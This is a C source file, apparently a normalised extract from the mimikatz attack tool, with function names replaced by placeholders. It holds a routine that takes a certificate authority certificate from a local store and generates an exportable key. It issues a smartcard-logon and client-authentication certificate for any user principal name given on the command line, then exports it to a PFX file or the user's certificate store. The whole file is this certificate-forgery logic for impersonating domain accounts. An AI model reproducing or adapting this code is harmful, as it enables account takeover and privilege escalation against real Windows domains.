#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_17__   TYPE_5__ ;
typedef  struct TYPE_16__   TYPE_4__ ;
typedef  struct TYPE_15__   TYPE_3__ ;
typedef  struct TYPE_14__   TYPE_2__ ;
typedef  struct TYPE_13__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  wchar_t ;
struct TYPE_17__ {char* pwszProvName; } ;
struct TYPE_16__ {int /*<<< orphan*/  member_0; } ;
struct TYPE_15__ {char* member_5; int member_7; char* cn; TYPE_4__* cdp; int /*<<< orphan*/ * member_12; TYPE_4__* member_11; TYPE_4__* member_10; scalar_t__ member_9; int /*<<< orphan*/  member_8; int /*<<< orphan*/ * member_6; int /*<<< orphan*/  member_4; int /*<<< orphan*/ * member_3; int /*<<< orphan*/ * member_2; int /*<<< orphan*/ * member_1; int /*<<< orphan*/ * member_0; } ;
struct TYPE_13__ {int /*<<< orphan*/  member_6; int /*<<< orphan*/ * member_5; int /*<<< orphan*/  member_4; int /*<<< orphan*/  member_3; int /*<<< orphan*/  member_2; int /*<<< orphan*/  member_1; int /*<<< orphan*/ * member_0; } ;
struct TYPE_14__ {int member_3; int /*<<< orphan*/ * pin; int /*<<< orphan*/  hProv; TYPE_5__ keyInfos; int /*<<< orphan*/  member_2; int /*<<< orphan*/ * member_1; TYPE_1__ member_0; } ;
typedef  int /*<<< orphan*/  PCCERT_CONTEXT ;
typedef  int /*<<< orphan*/ * PBYTE ;
typedef  int /*<<< orphan*/  NTSTATUS ;
typedef  char* LPCWSTR ;
typedef  TYPE_2__ KIWI_KEY_INFO ;
typedef  TYPE_3__ KIWI_CERT_INFO ;
typedef  int /*<<< orphan*/  HCRYPTPROV_LEGACY ;
typedef  int /*<<< orphan*/  HCERTSTORE ;
typedef  int /*<<< orphan*/  DWORD ;
typedef  TYPE_4__ CERT_EXTENSION ;
typedef  scalar_t__ BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  AT_KEYEXCHANGE ; 
 int /*<<< orphan*/  CERT_CLOSE_STORE_FORCE_FLAG ; 
 int CERT_DIGITAL_SIGNATURE_KEY_USAGE ; 
 int /*<<< orphan*/  CERT_FIND_SUBJECT_STR ; 
 int CERT_KEY_ENCIPHERMENT_KEY_USAGE ; 
 int CERT_STORE_OPEN_EXISTING_FLAG ; 
 int /*<<< orphan*/  CERT_STORE_PROV_SYSTEM ; 
 int CERT_STORE_READONLY_FLAG ; 
 int /*<<< orphan*/  CERT_SYSTEM_STORE_CURRENT_USER ; 
 int /*<<< orphan*/  CRYPT_EXPORTABLE ; 
 int /*<<< orphan*/  CRYPT_SILENT ; 
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ,int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,char*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int,char*) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 scalar_t__ FALSE ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  MIMIKATZ ; 
 int /*<<< orphan*/  MS_ENHANCED_PROV ; 
 char* MS_SCARD_PROV ; 
 int PKCS_7_ASN_ENCODING ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 int /*<<< orphan*/  PROV_RSA_FULL ; 
 int /*<<< orphan*/  STATUS_SUCCESS ; 
 int X509_ASN_ENCODING ; 
 scalar_t__ FUNC8 (TYPE_2__*,TYPE_3__*,int /*<<< orphan*/ ,int /*<<< orphan*/ *,int /*<<< orphan*/ **,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC9 (char*,char*,...) ; 
 scalar_t__ FUNC10 (TYPE_4__*,char*) ; 
 scalar_t__ FUNC11 (TYPE_4__*,int,char*) ; 
 scalar_t__ FUNC12 (TYPE_4__*,int,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC13 (TYPE_4__*) ; 
 scalar_t__ FUNC14 (int /*<<< orphan*/ *,int /*<<< orphan*/ ,TYPE_5__*,char*) ; 
 scalar_t__ FUNC15 (int /*<<< orphan*/ *,int /*<<< orphan*/ ,TYPE_5__*,int /*<<< orphan*/ ,char*,scalar_t__) ; 
 int /*<<< orphan*/  FUNC16 (int /*<<< orphan*/ ) ; 
 int FUNC17 (char*) ; 
 scalar_t__ FUNC18 (int,int /*<<< orphan*/ **,char*,char**,char*) ; 
 int /*<<< orphan*/ * FUNC19 (char*) ; 
 int /*<<< orphan*/  szOID_KP_SMARTCARD_LOGON ; 
 int /*<<< orphan*/  szOID_OIWSEC_sha1RSASign ; 
 int /*<<< orphan*/  szOID_PKIX_KP_CLIENT_AUTH ; 

NTSTATUS FUNC20(int argc, wchar_t * argv[])
{
	LPCWSTR szStoreCA, szNameCA, szPfx = NULL, szPin, szCrlDp;
	HCERTSTORE hCertStoreCA;
	PCCERT_CONTEXT pCertCtxCA;
	BOOL isExported = FALSE, noUserStore = FALSE;
	CERT_EXTENSION eku = {0}, san = {0}, cdp = {0};
	DWORD szCertificate = 0;
	PBYTE Certificate = NULL;
	KIWI_KEY_INFO ki = {{NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_SILENT, 0, NULL, AT_KEYEXCHANGE}, NULL, CRYPT_EXPORTABLE, 2048};
	KIWI_CERT_INFO ci = {NULL, NULL, NULL, NULL, &MIMIKATZ, L"FR", NULL, CERT_DIGITAL_SIGNATURE_KEY_USAGE | CERT_KEY_ENCIPHERMENT_KEY_USAGE, szOID_OIWSEC_sha1RSASign/*szOID_RSA_SHA256RSA*/, FALSE, &eku, &san, NULL};

	if(FUNC18(argc, argv, L"hw", NULL, NULL))
	{
		FUNC18(argc, argv, L"csp", &ki.keyInfos.pwszProvName, MS_SCARD_PROV);
		if(FUNC18(argc, argv, L"pin", &szPin, NULL))
			ki.pin = FUNC19(szPin);
	}
	noUserStore = FUNC18(argc, argv, L"nostore", NULL, NULL);
	FUNC18(argc, argv, L"castore", &szStoreCA, L"LOCAL_MACHINE");
	if(FUNC18(argc, argv, L"caname", &szNameCA, NULL))
	{
		if(FUNC18(argc, argv, L"upn", &ci.cn, NULL))
		{
			FUNC9(L"CA store       : %s\n", szStoreCA);
			if((hCertStoreCA = FUNC3(CERT_STORE_PROV_SYSTEM, 0, (HCRYPTPROV_LEGACY) NULL, FUNC17(szStoreCA) | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG, L"My")))
			{
				FUNC9(L"CA name        : %s\n", szNameCA);
				if((pCertCtxCA = FUNC1(hCertStoreCA, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 0, CERT_FIND_SUBJECT_STR, szNameCA, NULL)))
				{
					if(FUNC12(&eku, 2, szOID_KP_SMARTCARD_LOGON, szOID_PKIX_KP_CLIENT_AUTH))
					{
						if(FUNC10(&san, ci.cn))
						{
							if(FUNC18(argc, argv, L"crldp", &szCrlDp, NULL))
								if(FUNC11(&cdp, 1, szCrlDp))
									ci.cdp = &cdp;

							if(FUNC8(&ki, &ci, pCertCtxCA, NULL, &Certificate, &szCertificate, NULL))
							{
								if(FUNC18(argc, argv, L"pfx", &szPfx, NULL))
								{
									isExported = FUNC14(Certificate, szCertificate, &ki.keyInfos, szPfx);
									FUNC9(L"Private Export : %s - %s\n", szPfx, isExported ? L"OK" : L"KO");
								}
								else if(!noUserStore)
								{
									isExported = FUNC15(Certificate, szCertificate, &ki.keyInfos, CERT_SYSTEM_STORE_CURRENT_USER, L"My", FALSE);
									FUNC9(L"Private Store  : CERT_SYSTEM_STORE_CURRENT_USER/My - %s\n", isExported ? L"OK" : L"KO");
								}

								if(!isExported || szPfx)
									FUNC16(ki.hProv);
								else
									FUNC4(ki.hProv, 0);
								FUNC5(Certificate);
							}
							if(ci.cdp)
								FUNC13(ci.cdp);
							FUNC13(&san);
						}
						else FUNC7(L"Unable to generate SAN extension - kuhl_m_crypto_c_sc_auth_Ext_AltUPN");
						FUNC13(&eku);
					}
					else FUNC7(L"Unable to generate EKU extension - kuhl_m_crypto_c_sc_auth_Ext_EKU");
					FUNC2(pCertCtxCA);
				}
				else FUNC7(L"CertFindCertificateInStore");
				FUNC0(hCertStoreCA, CERT_CLOSE_STORE_FORCE_FLAG);
			}
			else FUNC7(L"CertOpenStore");
		}
		else FUNC6(L"/upn:user@domain.local needed\n");
	}
	else FUNC6(L"/caname:CA-KIWI needed\n");

	if(ki.pin)
		FUNC5(ki.pin);
	return STATUS_SUCCESS;
}